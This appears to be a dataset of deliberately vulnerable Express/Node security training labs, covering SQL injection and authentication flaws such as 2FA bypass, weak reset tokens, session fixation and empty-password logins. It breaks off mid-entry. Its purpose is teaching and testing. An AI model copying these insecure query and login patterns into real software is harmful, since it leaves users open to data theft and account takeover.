"Lab scenario": "IoT device configuration retrieval injection",
"Lab Description": "This lab simulates an IoT backend where device configuration data is retrieved based on an unsanitized device ID. An attacker can inject SQL to access configurations of other devices.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE devices (id INTEGER PRIMARY KEY, config TEXT)\");\n  db.run(\"INSERT INTO devices (config) VALUES ('Device1Config')\");\n});\n\napp.post('/getConfig', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const query = `SELECT config FROM devices WHERE id = '${deviceId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.config : 'No config found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Academic portal grade retrieval injection",
"Lab Description": "This lab simulates an academic portal that retrieves student grades based on user input. Unsanitized input allows attackers to inject SQL to view grades for all students.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE grades (id INTEGER PRIMARY KEY, student TEXT, grade TEXT)\");\n  db.run(\"INSERT INTO grades (student, grade) VALUES ('John Doe', 'A')\");\n});\n\napp.post('/getGrades', (req, res) => {\n  const student = req.body.student;\n  const query = `SELECT * FROM grades WHERE student = '${student}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Event feedback injection for vote manipulation",
"Lab Description": "This lab simulates an event feedback system where users submit votes via a feedback form. Unsanitized input allows attackers to inject SQL to manipulate vote counts.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE feedback (id INTEGER PRIMARY KEY, event TEXT, votes INTEGER)\");\n  db.run(\"INSERT INTO feedback (event, votes) VALUES ('Conference', 10)\");\n});\n\napp.post('/submitFeedback', (req, res) => {\n  const event = req.body.event;\n  const votes = req.body.votes;\n  const query = `UPDATE feedback SET votes = votes + ${votes} WHERE event = '${event}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Feedback updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "SMS gateway message log retrieval injection",
"Lab Description": "This lab simulates an SMS gateway where message logs are stored in a database. Unsanitized input in the log retrieval query allows attackers to extract all SMS logs.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sms_logs (id INTEGER PRIMARY KEY, sender TEXT, message TEXT)\");\n  db.run(\"INSERT INTO sms_logs (sender, message) VALUES ('12345', 'Hello World')\");\n});\n\napp.post('/getSMSLogs', (req, res) => {\n  const sender = req.body.sender;\n  const query = `SELECT * FROM sms_logs WHERE sender = '${sender}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Banking app account balance inquiry injection",
"Lab Description": "This lab simulates a banking application where the account balance is retrieved based on user-provided account numbers. Unsanitized input allows attackers to inject SQL and retrieve balances of any account.",
"Vulnerability name": "SQL Injection",
"lab level": "Hard",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, accountNumber TEXT, balance REAL)\");\n  db.run(\"INSERT INTO accounts (accountNumber, balance) VALUES ('ACC123', 2500.00)\");\n});\n\napp.post('/getBalance', (req, res) => {\n  const account = req.body.accountNumber;\n  const query = `SELECT balance FROM accounts WHERE accountNumber = '${account}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.balance.toString() : 'No account found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Retail store inventory lookup injection",
"Lab Description": "This lab simulates a retail store inventory lookup where product information is retrieved via a GET request. Unsanitized product input allows attackers to inject SQL and view inventory for all products.",
"Vulnerability name": "SQL Injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE inventory (id INTEGER PRIMARY KEY, product TEXT, stock INTEGER)\");\n  db.run(\"INSERT INTO inventory (product, stock) VALUES ('Printer', 10)\");\n});\n\napp.get('/inventory', (req, res) => {\n  const product = req.query.product;\n  const query = `SELECT * FROM inventory WHERE product = '${product}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
"Lab scenario": "Customer loyalty program authentication injection",
"Lab Description": "This lab simulates an authentication system for a customer loyalty program that uses unsanitized input in the SQL query. Attackers can inject SQL to bypass authentication and view loyalty points.",
"Vulnerability name": "SQL Injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE loyalty (id INTEGER PRIMARY KEY, username TEXT, points INTEGER)\");\n  db.run(\"INSERT INTO loyalty (username, points) VALUES ('user1', 100)\");\n});\n\napp.post('/checkLoyalty', (req, res) => {\n  const username = req.body.username;\n  const query = `SELECT * FROM loyalty WHERE username = '${username}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
}










,


{
  "Lab scenario": "2FA simple bypass",
  "Lab Description": "This lab's two-factor Autnenticationcan be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123', is2FAEnabled: true }]; app.post('/login', (req, res) => { const { username, password, code } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (user.is2FAEnabled && !code) return res.status(200).send('2FA code required'); res.send(`Welcome, ${username}!`); }); const PORT = 4000; app.listen(PORT, () => console.log(`2FA Bypass Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Password reset broken logic",
  "Lab Description": "This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'oldpassword' }]; app.post('/reset-password', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (user) { res.send('Password reset link sent to your email'); } else { res.status(400).send('User not found'); } }); app.post('/set-new-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send('Password changed successfully'); } else { res.status(400).send('User not found'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send(`Welcome, ${username}!`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Password Reset Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Username enumeration via subtly different responses",
  "Lab Description": "This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nTo solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { res.status(401).send('Invalid username'); return; } if (user.password !== password) { res.status(401).send('Invalid password'); return; } res.send(`Welcome, ${username}!`); }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Username enumeration via response timing",
  "Lab Description": "This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { setTimeout(() => res.status(401).send('Invalid username'), 1000); return; } if (user.password !== password) { res.status(401).send('Invalid password'); return; } res.send(`Welcome, ${username}!`); }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration via Timing Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Username enumeration via account lock",
  "Lab Description": "This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepassword', attempts: 0, locked: false }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { return res.status(401).json({ error: 'Invalid credentials' }); } if (user.locked) { return res.status(403).json({ error: 'Account locked' }); } if (user.password === password) { user.attempts = 0; res.json({ message: 'Login successful' }); } else { user.attempts++; if (user.attempts >= 3) { user.locked = true; } res.status(401).json({ error: 'Invalid credentials' }); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "2FA broken logic",
  "Lab Description": "This lab's two-factor Autnenticationis vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.\nYou also have access to the email server to receive your 2FA verification code.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepassword', verified: false }]; let verificationCodes = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).json({ error: 'Invalid credentials' }); } verificationCodes[username] = '123456'; res.json({ message: '2FA code sent' }); }); app.post('/verify-2fa', (req, res) => { const { username, code } = req.body; if (verificationCodes[username] === code || !code) { users.find(u => u.username === username).verified = true; res.json({ message: '2FA verification bypassed' }); } else { res.status(403).json({ error: 'Invalid 2FA code' }); } }); const PORT = 4000; app.listen(PORT, () => console.log(`2FA Broken Logic Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Brute-forcing a stay-logged-in cookie",
  "Lab Description": "This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.\nTo solve the lab, brute-force Carlos's cookie to gain access to his My account page.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = {\n  'carlos': { password: 'secure123', session: 'abcd1234' },\n  'admin': { password: 'admin123', session: 'xyz9876' }\n};\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (users[username] && users[username].password === password) {\n    res.cookie('session', users[username].session);\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const session = req.cookies.session;\n  const user = Object.keys(users).find(u => users[u].session === session);\n  if (user) {\n    res.send(`Welcome ${user}`);\n  } else {\n    res.send('Access denied');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "Offline password cracking",
  "Lab Description": "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \"My account\" page.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express=require('express'),sqlite3=require('sqlite3').verbose(),bodyParser=require('body-parser'),crypto=require('crypto'),app=express();app.use(bodyParser.json());app.use(bodyParser.urlencoded({extended:true}));const db=new sqlite3.Database(':memory:');db.serialize(()=>{db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT)\");db.run(\"INSERT INTO users (username, password_hash) VALUES ('carlos', '5f4dcc3b5aa765d61d8327deb882cf99')\");});app.get('/comments',(req,res)=>{const comment=req.query.comment;res.send(`<p>${comment}</p>`);});app.get('/cookie',(req,res)=>{res.cookie('session','carlos_cookie_hash');res.send(\"Cookie set for Carlos.\");});app.post('/login',(req,res)=>{const{username,password}=req.body;if(!username||!password){return res.status(400).send(\"Username and password are required.\");}const hashedPassword=crypto.createHash('md5').update(password).digest('hex');const query=`SELECT * FROM users WHERE username='${username}' AND password_hash='${hashedPassword}'`;db.all(query,[],(err,rows)=>{if(err){res.status(500).send(\"Error occurred during login.\");}else if(rows.length>0){res.send(\"Login successful!\");}else{res.send(\"Invalid credentials.\");}});});const PORT=3000;app.listen(PORT,()=>console.log(`Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Password reset poisoning via middleware",
  "Lab Description": "This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={\"carlos\":{email:\"carlos@example.com\",password:\"securepassword\"},\"wiener\":{email:\"wiener@example.com\",password:\"peter\"}};app.post('/reset-password',(req,res)=>{const{email}=req.body;if(!email||!users[email.split('@')[0]]){return res.status(400).send(\"User not found.\");}const resetLink=`${req.headers.host}/reset?user=${email.split('@')[0]}`;console.log(\"Password reset link:\",resetLink);res.send(`Password reset link sent to ${email}: <a href=\"http://${resetLink}\">${resetLink}</a>`);});app.listen(3000,()=>console.log(\"Lab running on http://localhost:3000\"));"
},
{
  "Lab scenario": "Password brute-force via password change",
  "Lab Description": "This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his \"My account\" page.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={\"carlos\":{password:\"securepassword\"},\"wiener\":{password:\"peter\"}};app.post('/change-password',(req,res)=>{const{username,oldPassword,newPassword}=req.body;if(!users[username]||users[username].password!==oldPassword){return res.status(401).send(\"Invalid credentials.\");}users[username].password=newPassword;console.log(`Password changed for ${username}`);res.send(\"Password changed successfully.\");});app.listen(3000,()=>console.log(\"Lab running on http://localhost:3000\"));"
},
{
  "Lab scenario": "Broken brute-force protection, multiple credentials per request",
  "Lab Description": "This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={'carlos':{password:'securepassword'},'wiener':{password:'peter'}};app.post('/login',(req,res)=>{const{credentials}=req.body;let success=false;credentials.forEach(({username,password})=>{if(users[username]&&users[username].password===password)success=true;});if(success)return res.send('Login successful!');else return res.status(401).send('Invalid credentials.');});app.listen(3000,()=>console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "2FA bypass using a brute-force attack",
  "Lab Description": "This lab's two-factor Autnenticationis vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.\nVictim's credentials: carlos:montoya",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={'carlos':{password:'montoya',otp:'0000'}};let attempts={};app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]&&users[username].password===password)return res.json({message:'Enter 2FA code',user:username});else return res.status(401).send('Invalid credentials.');});app.post('/verify-2fa',(req,res)=>{const{username,otp}=req.body;if(!attempts[username])attempts[username]=0;attempts[username]++;if(users[username]&&users[username].otp===otp)return res.send('Login successful!');else return res.status(401).send('Invalid 2FA code.');});app.listen(3000,()=>console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Weak password reset token",
  "Lab Description": "This lab's password reset functionality generates weak, predictable reset tokens. An attacker can enumerate tokens to reset another user's password and gain unauthorized access. To solve the lab, exploit the weak token mechanism to reset Carlos's password and access his account page.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', email: 'carlos@example.com', password: 'securepassword' }];\nconst resetTokens = {}; // Store reset tokens temporarily\n\n// Request password reset\napp.post('/reset-password', (req, res) => {\n    const { email } = req.body;\n    const user = users.find(u => u.email === email);\n    if (!user) return res.status(400).send('User not found');\n    \n    // Weak token generation (predictable)\n    const token = Buffer.from(email).toString('hex').slice(0, 8); \n    resetTokens[token] = user.username;\n    res.send(`Password reset token: ${token}`);\n});\n\n// Reset password\napp.post('/change-password', (req, res) => {\n    const { token, newPassword } = req.body;\n    if (!resetTokens[token]) return res.status(400).send('Invalid token');\n    \n    const username = resetTokens[token];\n    const user = users.find(u => u.username === username);\n    user.password = newPassword;\n    delete resetTokens[token]; // Remove used token\n    res.send('Password reset successful');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Weak Password Reset Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Session fixation vulnerability via unrotated session tokens",
  "Lab Description": "This lab demonstrates a session fixation vulnerability. The application does not renew the session identifier upon successful login, leaving the session token predictable and fixed. An attacker can set a predetermined session ID and trick a victim into logging in with that token. To solve the lab, exploit this vulnerability by forcing the victim to use a known session token and then hijack their session to access their account.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Configure session without regenerating session ID on login\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true\n}));\n\n// Sample user database\nconst users = [{ username: 'carlos', password: 'password123' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" required />\n            <input type=\"password\" name=\"password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        // Note: The session ID is NOT regenerated after login, leaving the token fixed\n        req.session.user = user.username;\n        res.send(`Welcome, ${user.username}. Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Brute-force attack on an insecure login mechanism",
  "Lab Description": "This lab demonstrates a brute-force attack due to the absence of rate limiting. The application allows unlimited login attempts without restrictions, making it vulnerable to credential stuffing attacks. To solve the lab, use brute-force techniques to discover the credentials of Carlos and access his account.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nconst users = [{ username: 'carlos', password: 'securepassword' }];\n\n// Login route (no brute-force protection)\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${user.username}!`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Brute-Force Login Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predictable 'Remember Me' token allows session hijacking",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability in the 'Remember Me' functionality. The application generates a remember-me token using a weak, predictable algorithm\u2014specifically, an MD5 hash of the username. This allows an attacker to forge a valid token and hijack a victim's session. To solve the lab, generate a forged remember-me token for a victim (e.g., carlos), use it to access the victim's account page, and retrieve the flag.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simple user database with insecure 'Remember Me' functionality\nconst users = [{ username: 'carlos', password: 'securepassword' }];\nconst tokens = {};\n\n// Login route - generates a predictable token if 'rememberMe' is enabled\napp.post('/login', (req, res) => {\n    const { username, password, rememberMe } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (!user) return res.status(401).send('Invalid credentials');\n    if (rememberMe) {\n        // Insecure token generation: MD5 of the username\n        const token = crypto.createHash('md5').update(username).digest('hex');\n        tokens[token] = username;\n        res.send(`Login successful. Your remember-me token is ${token}`);\n    } else {\n        res.send(`Login successful for ${username}`);\n    }\n});\n\n// Protected account route that checks for a remember-me token via query parameter\napp.get('/account', (req, res) => {\n    const token = req.query.token;\n    if (token && tokens[token]) {\n        res.send(`Welcome to your account, ${tokens[token]}! Flag: FLAG{remember_me_hijack_successful}`);\n    } else {\n        res.status(403).send('Access denied. Invalid or missing token.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Remember Me Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Default credentials bypass in login form",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability caused by misconfigured default credentials. The login form fails to properly validate the username; if the username field is left empty, the application automatically assigns 'admin' as the username. To solve the lab, simply submit an empty username along with any password to gain access to the admin account page.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method='POST' action='/login'>\n            <input type='text' name='username' placeholder='Username' />\n            <input type='password' name='password' placeholder='Password' />\n            <button type='submit'>Login</button>\n        </form>\n    `);\n});\n\n// Login route with default admin bypass\napp.post('/login', (req, res) => {\n    let { username, password } = req.body;\n    // If username is empty or only whitespace, default to 'admin'\n    if (!username || username.trim() === '') {\n        username = 'admin';\n    }\n    // For demonstration purposes, any password is accepted\n    res.send(`Welcome, ${username}!`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Default Credentials Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass due to missing password validation",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability where the login form fails to enforce a proper password check. As a result, if a user submits a valid username with an empty password, the system logs them in. To solve the lab, log in as the target user by providing the correct username and leaving the password field empty.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded user database\nconst users = [{ username: 'admin', password: 'supersecret' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route with vulnerability: if password is empty, bypass check\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    // Vulnerability: if password is empty, allow login\n    if (user && (password === user.password || password === '')) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`No Password Check Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass via hidden parameter injection",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability caused by a hidden parameter that bypasses password checks. The login form includes a hidden field named 'bypass' which, if set to '1', causes the server to skip the password validation and log in the user. To solve the lab, manipulate the login request to set the 'bypass' parameter to '1' and log in as the admin user.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded user database\nconst users = [{ username: 'admin', password: 'admin123' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <input type=\"hidden\" name=\"bypass\" value=\"0\" />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route with vulnerability: if 'bypass' equals '1', skip password check\napp.post('/login', (req, res) => {\n    const { username, password, bypass } = req.body;\n    if (bypass === '1') {\n        res.send(`Welcome, ${username}! (Bypassed)`);\n        return;\n    }\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Hidden Parameter Bypass Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass via type coercion vulnerability",
  "Lab Description": "This lab demonstrates an Autnenticationbypass due to improper type coercion in the login function. The server stores the password as a number and uses non-strict equality (==) for comparison, so a string like '0' is considered equal to 0. To solve the lab, exploit this vulnerability by logging in as the admin user using '0' as the password, and access the protected resource.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user with password stored as a number\nconst users = [\n  { username: 'admin', password: 0 }  // The password is stored as 0\n];\n\napp.get('/', (req, res) => {\n    res.send(`\n      <h2>Login</h2>\n      <form method=\"POST\" action=\"/login\">\n          <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n          <input type=\"text\" name=\"password\" placeholder=\"Password\" required />\n          <button type=\"submit\">Login</button>\n      </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    // Vulnerability: using non-strict equality (==) so '0' == 0 evaluates to true\n    if (user && password == user.password) {\n        res.send(`Welcome, ${username}! You have bypassed Autnenticationusing type coercion.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Type Coercion Bypass Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Login bypass via HTTP parameter pollution",
  "Lab Description": "This lab demonstrates an Autnenticationbypass caused by HTTP parameter pollution. The application processes multiple instances of the same parameter inconsistently. If an attacker submits multiple 'password' parameters in the login request, the server incorrectly validates the login. To solve the lab, send a login request with two password parameters and access the admin account.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
